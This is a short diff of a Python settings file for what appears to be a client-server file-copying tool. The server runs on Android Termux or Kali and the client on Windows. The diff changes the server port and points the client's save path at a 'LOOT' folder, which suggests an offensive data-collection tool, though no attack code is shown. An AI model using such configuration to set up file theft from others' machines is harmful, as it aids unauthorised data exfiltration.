@@ -15,7 +15,7 @@ server_savecopy_path = '/data/data/com.termux/files/home/'  # for android Termux
 
 # server_port = 443  # for connection (best choice)
 # for connection (android Termux does not allow for 443. So just use this. maybe might fail?)
-server_port = 4000
+server_port = 8080
 
 # for copy files. need to always turn on ssh in kali. "sudo service ssh start"
 server_ssh_port = 8022  # for Termux default
@@ -23,4 +23,4 @@ server_ssh_port = 8022  # for Termux default
 
 # Client side settings
 client_savecopy_path = (
-    "C:\\Users\\{}").format(client_username)
+        "C:\\Users\\{}\\LOOT").format(client_username)
